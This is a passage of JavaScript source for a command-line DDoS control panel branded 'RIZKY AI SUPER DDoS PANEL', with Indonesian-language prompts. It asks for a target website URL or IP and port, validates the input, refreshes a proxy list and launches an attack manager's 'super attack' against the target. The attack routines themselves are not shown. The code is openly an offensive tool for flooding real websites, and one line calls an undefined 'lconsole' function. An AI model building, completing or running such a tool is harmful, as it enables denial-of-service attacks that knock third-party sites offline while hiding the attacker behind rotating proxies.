console.log('\x1b[1;36m📋 MENU PILIHAN TARGET:\x1b[0m');
console.log('\x1b[1;32m[1] 🟢 GUNAKAN URL WEBSITE\x1b[0m');
console.log('\x1b[1;34m[2] 🔵 GUNAKAN IP ADDRESS WEBSITE\x1b[0m');
console.log('\x1b[1;31m[3] ❌ KELUAR DARI PROGRAM\x1b[0m');
console.log('');
rl.question('\x1b[1;33m[🎯] Pilih opsi (1-3): \x1b[0m', (choice) => {
switch (choice) {
case '1':
askForWebsiteUrl();
break;
case '2':
askForIpAddress();
break;
case '3':
console.log('\x1b[1;32m👋 Terima kasih telah menggunakan RIZKY AI!\x1b[0m');
process.exit(0);
break;
default:
console.log('\x1b[1;31m❌ Pilihan tidak valid! Silakan pilih 1, 2, atau 3.\x1b[0m');
setTimeout(() => showTargetSelectionMenu(), 2000);
break;
}
});
}
function askForWebsiteUrl() {
console.log('\x1b[1;34m🌐 WEBSITE URL INPUT\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log('');
console.log('\x1b[1;36m💡 Contoh: https://example.com atau http://targetwebsite.com\x1b[0m');
console.log('');
rl.question('\x1b[1;33m[🌐] Masukkan URL Website: \x1b[0m', async (url) => {
if (!url.startsWith("http://") && !url.startsWith("https://")) {
showErrorMessage('URL harus diawali dengan http:// atau https://');
setTimeout(() => askForWebsiteUrl(), 2000);
return;
}
if (!validateUrl(url)) {
showErrorMessage('Format URL tidak valid!');
setTimeout(() => askForWebsiteUrl(), 2000);
return;
}
await startAttackProcess(url, 'WEBSITE');
});
}
function askForIpAddress() {
console.log('\x1b[1;34m🔵 IP ADDRESS INPUT\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log('');
console.log('\x1b[1;36m💡 Contoh: 192.168.1.1:80 atau 104.16.249.249:443\x1b[0m');
console.log('\x1b[1;36m💡 Port akan otomatis ditambahkan jika tidak disertakan\x1b[0m');
console.log('');
rl.question('\x1b[1;33m[🔵] Masukkan IP Address: \x1b[0m', async (ipInput) => {
let targetUrl = formatIpTarget(ipInput);
if (!validateIpAddress(ipInput)) {
showErrorMessage('Format IP Address tidak valid!');
setTimeout(() => askForIpAddress(), 2000);
return;
}
await startAttackProcess(targetUrl, 'IP');
});
}
function formatIpTarget(ipInput) {
if (ipInput.includes(':')) {
const parts = ipInput.split(':');
if (parts.length === 2) {
return `http://${parts[0]}:${parts[1]}`;
}
}
return `http://${ipInput}:80`;
}
function validateUrl(url) {
try {
new URL(url);
return true;
} catch (error) {
return false;
}
}
function validateIpAddress(ip) {
const ipPattern = /^(\d{1,3}\.){3}\d{1,3}(:\d{1,5})?$/;
if (!ipPattern.test(ip)) return false;
const parts = ip.split(':')[0].split('.');
for (let part of parts) {
const num = parseInt(part);
if (num < 0 || num > 255) return false;
}
return true;
}
async function startAttackProcess(targetUrl, type) {
showLoadingScreen(targetUrl, type);
try {
await attackManager.updateProxies();
} catch (error) {
lconsole.log('\x1b[1;33m⚠️ Gagal update proxy, menggunakan yang existing...\x1b[0m');
}
setTimeout(() => {
attackManager.targetUrl = targetUrl;
attackManager.startSuperAttack(targetUrl);
    }, 3000);
}
function showLoadingScreen(targetUrl, type) {
console.log('\x1Bc');
console.log('\x1b[1;36m🚀 MEMPERSIAPKAN SERANGAN 🚀\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log('');
console.log(`\x1b[1;37m🎯 Target: \x1b[1;32m${targetUrl}\x1b[0m`);
console.log(`\x1b[1;37m📝 Type: \x1b[1;32m${type}\x1b[0m`);
console.log('');
let progress = 0;
const interval = setInterval(() => {
progress += 2;
const width = 50;
const filled = Math.floor((progress / 100) * width);
const empty = width - filled;
const bar = '\x1b[1;32m█\x1b[0m'.repeat(filled) + '\x1b[1;90m▒\x1b[0m'.repeat(empty);
const steps = [
'Loading Attack Modules...',
'Initializing Proxy Rotation...',
'Setting Up Threads...',
'Configuring Bypass Methods...',
'Ready to Attack!'
];
const currentStep = steps[Math.floor(progress / 20)] || steps[steps.length - 1];
 process.stdout.write(`\r\x1b[1;36m[${bar}] ${progress}% 🚀 ${currentStep}\x1b[0m`);
if (progress >= 100) {
clearInterval(interval);
console.log('\n\n\x1b[1;32m✅ SERANGAN SIAP DILUNCURKAN!\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
    }
  }, 50);
}
function showErrorMessage(message) {
console.log('\n\x1b[1;31m❌ ERROR TERDETEKSI\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log(`\x1b[1;31m${message}\x1b[0m`);
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m\n');
}
// Handle CTRL+C
process.on('SIGINT', () => {
console.log('\n\n\x1b[1;31m🛑 MENGENTIKAN SERANGAN...\x1b[0m');
attackManager.stop();
setTimeout(() => {
console.log('\x1b[1;32m👋 TERIMA KASIH TELAH MENGGUNAKAN RIZKY AI!\x1b[0m');
process.exit(0);
    }, 2000);
});
// Start aplikasi
console.log('\x1b[1;35m🚀 MEMUAT RIZKY AI SUPER DDoS PANEL...\x1b[0m');
setTimeout(() => {
showMainMenu();
}, 1000);
